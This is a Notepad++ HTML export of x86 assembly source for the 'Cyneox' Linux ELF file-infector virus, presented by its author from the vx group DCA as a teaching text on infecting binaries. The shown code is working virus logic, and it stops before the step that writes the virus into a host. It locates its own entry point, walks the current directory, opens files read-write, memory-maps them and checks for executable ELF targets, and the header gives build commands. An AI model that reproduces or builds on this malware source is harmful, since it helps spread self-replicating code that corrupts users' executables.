<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;  ____ ___.__. ____   ____  _______  ___</span><span class="sc0">
</span><span class="sc1">;_/ ___&lt;   |  |/    \_/ __ \/  _ \  \/  /</span><span class="sc0">
</span><span class="sc1">;\  \___\___  |   |  \  ___(  &lt;_&gt; &gt;    &lt; </span><span class="sc0">
</span><span class="sc1">; \___  &gt; ____|___|  /\___  &gt;____/__/\_ \
;     \/\/         \/     \/           \/</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;                member of </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       _/_/_/      _/_/_/    _/_/    </span><span class="sc0">
</span><span class="sc1">;      _/    _/  _/        _/    _/   </span><span class="sc0">
</span><span class="sc1">;     _/    _/  _/        _/_/_/_/    </span><span class="sc0">
</span><span class="sc1">;    _/    _/  _/        _/    _/     </span><span class="sc0">
</span><span class="sc1">;   _/_/_/      _/_/_/  _/    _/      </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         /********************\
;         |    Introducing     |</span><span class="sc0">
</span><span class="sc1">;         \********************/</span><span class="sc0">
</span><span class="sc1">;                  +++</span><span class="sc0">
</span><span class="sc1">;    "Cyneox" is a source where you can find several techniques how to </span><span class="sc0">
</span><span class="sc1">;    infect ELF(Executable and Linking Format) files.The purpose of this</span><span class="sc0">
</span><span class="sc1">;    docu is to "teach" Linux passionated newbies how to infect binaries</span><span class="sc0">
</span><span class="sc1">;    using Linux.</span><span class="sc0">
</span><span class="sc1">;    I've never coded a W32 virus and I think I never do that too.When I started</span><span class="sc0">
</span><span class="sc1">;    coding virii I wanted to do sth special for the vx scene.So I started coding</span><span class="sc0">
</span><span class="sc1">;    ELF virii.Thats why I cant compare the complexity of a W32.Virus and a Lin.Virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        /**********************\
;        |      Knowledge       |</span><span class="sc0">
</span><span class="sc1">;        \**********************/</span><span class="sc0">
</span><span class="sc1">;                  +++</span><span class="sc0">
</span><span class="sc1">;    The knowledge you need to understand this code are:</span><span class="sc0">
</span><span class="sc1">;  1.Assembler knowledge: - if u dont know assembler I recommend you the PCASM tutorial from Dr.Paul Carter on</span><span class="sc0">
</span><span class="sc1">;                           http://www.drpaulcarter.com/pcasm</span><span class="sc0">
</span><span class="sc1">;  2.How ELF works      : - you should know how a ELF file looks like.</span><span class="sc0">
</span><span class="sc1">;                       : - search in internet for ELF tutorials or sth like that; there are plenty of them</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       /***********************\
;       |    About this code    |</span><span class="sc0">
</span><span class="sc1">;       \***********************/</span><span class="sc0">
</span><span class="sc1">;                  +++</span><span class="sc0">
</span><span class="sc1">;    As I said this source shows you some techniques how to infect ELF files.Actually there are more than common </span><span class="sc0">
</span><span class="sc1">;    infection techniques that you might use during programming: There are also techniques how to use that sys calls </span><span class="sc0">
</span><span class="sc1">;    under Linux. They're vital for the ASM programming. Without them you couldn't code no ASM programmm more.</span><span class="sc0">
</span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      /************************\
;      |      Thanks to...      |</span><span class="sc0">
</span><span class="sc1">;      \************************/</span><span class="sc0">
</span><span class="sc1">;                 +++</span><span class="sc0">
</span><span class="sc1">;    I'll like to thank to: - all members of DCA for building such a great vx group</span><span class="sc0">
</span><span class="sc1">;                           - zenok : hey dude thanks for your support </span><span class="sc0">
</span><span class="sc1">;                                   : you see we've made it after all that problems</span><span class="sc0">
</span><span class="sc1">;                           </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      /***********************\
;      |        Author         |</span><span class="sc0">
</span><span class="sc1">;      \***********************/</span><span class="sc0">
</span><span class="sc1">;                +++</span><span class="sc0">
</span><span class="sc1">;    cyneox/DCA (Dark Coderz Attitude)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      /***********************\
;      |     To compile...     | </span><span class="sc0">
</span><span class="sc1">;      \***********************/</span><span class="sc0">
</span><span class="sc1">;                +++</span><span class="sc0">
</span><span class="sc1">;    To compile this source you'll need LD and NASM.</span><span class="sc0">
</span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc1">;    cyneox@DCA~&gt; nasm -f elf cyneox.asm</span><span class="sc0">
</span><span class="sc1">;    cyneox@DCA~&gt; ld -e main -o cyneox cyneox.o</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;************************************************************************</span><span class="sc0">



</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc0">
</span><span class="sc9">global</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">

</span><span class="sc1">;################### MAIN #######################</span><span class="sc0">
</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; here we'll save the contains of all register on stack...</span><span class="sc0">
         </span><span class="sc1">; finally we create a stack frame by saving the old ebp on the stack</span><span class="sc0">
       </span><span class="sc1">; and updating esp with the address of the old ebp</span><span class="sc0">

            
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; getting addres of argv[0]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; storing own name (host)</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
            
</span><span class="sc1">;################### _BOO #######################</span><span class="sc0">
</span><span class="sc5">_boo</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; now we create enough space for the stack where we can store our data</span><span class="sc0">
        </span><span class="sc1">; and then we'll store the current working directory on the stack</span><span class="sc0">

               </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1840</span><span class="sc0">  
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">183</span><span class="sc0">            </span><span class="sc1">; SYS_GETCWD</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">820</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">           </span><span class="sc1">; path_lenght</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">

</span><span class="sc1">;################## OPEN ########################</span><span class="sc0">
</span><span class="sc5">open</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; here i'll get the e_entry of host ( with host i mean the binary</span><span class="sc0">
        </span><span class="sc1">; which we are now executing) and store it to stack.i do that coz</span><span class="sc0">
      </span><span class="sc1">; i must now where the virus is ( in a infected file) so i can infect other</span><span class="sc0">
        </span><span class="sc1">; files by coping the virus in the host file from e_entry...</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">              </span><span class="sc1">; SYS_OPEN</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">; esi = argv[0]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">

           </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; ebx = fd</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">              </span><span class="sc1">; SYS_READ</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">45</span><span class="sc0">             </span><span class="sc1">; needed for the first bytes of the file</span><span class="sc0">
                                  </span><span class="sc1">; so that we can extract the e_entry</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">44</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">

               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0x18</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ELF</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">45</span><span class="sc4">+</span><span class="sc2">1840</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; store temporary e_entry oh argv[0]</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">45</span><span class="sc0">            </span><span class="sc1">; restoring temp stack</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">             </span><span class="sc1">; SYS_CLOSE</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
           
        </span><span class="sc1">; we'll "open" the current working directory "." and  then we'll copy</span><span class="sc0">
        </span><span class="sc1">; the file descriptor which we'll need to infect the files that the</span><span class="sc0">
        </span><span class="sc1">; directory contains...</span><span class="sc0">
           
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">             </span><span class="sc1">; SYS_OPEN</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">point</span><span class="sc0">         </span><span class="sc1">; 0x002e="."</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
           
           </span><span class="sc1">; checking if open() returned successfully...</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">ok_stat</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">

</span><span class="sc1">;################# OK_STAT ######################          </span><span class="sc0">
</span><span class="sc5">ok_stat</span><span class="sc4">:</span><span class="sc0">          
               </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">          </span><span class="sc1">; ebx=fd</span><span class="sc0">
               </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
           
           </span><span class="sc1">; reading the directory and searching for files to infect</span><span class="sc0">
           
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">554</span><span class="sc0">

</span><span class="sc1">;################# READDIR ######################</span><span class="sc0">
</span><span class="sc5">readdir</span><span class="sc4">:</span><span class="sc0">      
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">89</span><span class="sc0">           </span><span class="sc1">; SYS_READDIR</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
           
           </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; cmp eax,1</span><span class="sc0">
           </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_dir</span><span class="sc0">            </span><span class="sc1">; jne exit</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">             </span><span class="sc1">; jmp ok_dir</span><span class="sc0">
    
    </span><span class="sc1">; here we actually start our infect function coz we got the file name</span><span class="sc0">
    </span><span class="sc1">; and the next to do is to check if we have read-write rights on that file</span><span class="sc0">

</span><span class="sc1">;################# OK_DIR #######################</span><span class="sc0">
</span><span class="sc5">ok_dir</span><span class="sc4">:</span><span class="sc0">            
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1840</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; esi = e_entry</span><span class="sc0">

           </span><span class="sc6">pusha</span><span class="sc0">                </span><span class="sc1">; save registers before infecting</span><span class="sc0">

        </span><span class="sc1">; here i'll beginn to check that file wheter it is a ELF file and wheter we can execute it.</span><span class="sc0">
      </span><span class="sc1">; remember: in linux you have objects,relocatables,libraries etc.</span><span class="sc0">

           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc0">           </span><span class="sc1">; creating space</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">44</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; saving file name to stack</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">48</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; saving e_entry to stack </span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; SYS_OPEN</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; O_RDWR</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; storing fd to stack</span><span class="sc0">
           
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">stat</span><span class="sc0">


</span><span class="sc1">;############### BACK ##########################           </span><span class="sc0">
</span><span class="sc5">back</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
           
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc0">
           </span><span class="sc6">popa</span><span class="sc0"> 
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">readdir</span><span class="sc0">

</span><span class="sc1">;############### STAT ##########################</span><span class="sc0">
</span><span class="sc5">stat</span><span class="sc4">:</span><span class="sc0">          

       </span><span class="sc1">; stat the file so that we're able to mmap to file coz i don't want to</span><span class="sc0">
       </span><span class="sc1">; modify the file during "execution" since we have read-write rights</span><span class="sc0">
       </span><span class="sc1">; from the stat structure we need only the file lenghts needed for</span><span class="sc0">
       </span><span class="sc1">; the mmap function ...</span><span class="sc0">
                  
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">106</span><span class="sc0">                    </span><span class="sc1">; SYS_STAT</span><span class="sc0">

           </span><span class="sc1">; "defining" stat structure (thats a funny mode to</span><span class="sc0">
               </span><span class="sc1">; declare a structure,isn't it ??? i'm still used to c ;)  )</span><span class="sc0">

           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">                     </span><span class="sc1">; struct stat *stat ;</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
           
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; file lenght from stat struct</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">                     </span><span class="sc1">; restoring stat struture</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; file lenght</span><span class="sc0">
           

</span><span class="sc1">;############# MMAP ###########################</span><span class="sc0">
</span><span class="sc5">mmap</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc1">; mmapping our file to check if is a executable ELF file</span><span class="sc0">
     </span><span class="sc1">; and for writting the infected file back to host...</span><span class="sc0">

                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc0">           </span><span class="sc1">; SYS_MMAP</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; file lenght</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; fd</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">           </span><span class="sc1">; mmap structure</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; int start</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; file lenght</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">  </span><span class="sc1">; 3 = READ_WRITE</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; 2 = MMAP_PRIVATE</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; fd</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; offset = 0</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">          </span><span class="sc1">; ptr to our mmap structure</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">

           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">           </span><span class="sc1">; restore mmap structure</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ok_mmap</span><span class="sc0">


</span><span class="sc1">;############# CLOSE #########################         </span><span class="sc0">
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">            </span><span class="sc1">; SYS_CLOSE</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; fd</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">

           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc0">           </span><span class="sc1">; restore stack we have defined in ok_dir(top)</span><span class="sc0">

           </span><span class="sc6">popad</span><span class="sc0">                </span><span class="sc1">; pop contains of registers</span><span class="sc0">
                                    </span><span class="sc1">; ...needed for the function readdir , which</span><span class="sc0">
                          </span><span class="sc1">; needs ecx(address of dirent structure)</span><span class="sc0">
                          </span><span class="sc1">; and ebx (file descriptor of that dir)</span><span class="sc0">

           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">readdir</span><span class="sc0">

</span><span class="sc1">;############## OK_MMAP ######################         </span><span class="sc0">
</span><span class="sc5">ok_mmap</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; pointer to our mapped file</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0x464c457f</span><span class="sc0">   </span><span class="sc1">; ELF</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_elf</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_elf</span><span class="sc0">


</span><span class="sc1">;############## OK_ELF ########################        </span><span class="sc0">
</span><span class="sc5">ok_elf</span><span class="sc4">:</span><span class="sc0">           
           </span><span class="sc1">; checking if this file can be executed ...</span><span class="sc0">
               </span><span class="sc1">; we don't want any object files or sth like that.</span><span class="sc0">
               </span><span class="sc1">; i don't even know who to infect them ;( i hope i'll code in</span><span class="sc0">
               </span><span class="sc1">; the future a object infector too.</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1073844240</span><span class="sc0">         </span><span class="sc1">; integer of ET_EXEC=1073844240</span><span class="sc0">
               </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">is_ex</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_elf</span><span class="sc0">

      </span><span class="sc1">; checking if file is executable.you might wondering whats</span><span class="sc0">
      </span><span class="sc1">; "1073844240" ??? well let me explain it to you: in &lt;elf.h&gt;</span><span class="sc0">
      </span><span class="sc1">; i found that ET_EXEC=2. printf("%x",e_type) showed to me several</span><span class="sc0">
      </span><span class="sc1">; outputs.and i observed by the executables files that they had a</span><span class="sc0">
      </span><span class="sc1">; specific hex-code.so i transformed that hex-code in an integer</span><span class="sc0">
      </span><span class="sc1">; so that i compare e_type with my integer.in my code i found out</span><span class="sc0">
      </span><span class="sc1">; that the integer of ET_EXEC is 1073844240.if you didn't understand</span><span class="sc0">
      </span><span class="sc1">; that please mail : cyneox@hotmail.com</span><span class="sc0">
      
</span><span class="sc1">;############# IS_EX ##########################</span><span class="sc0">
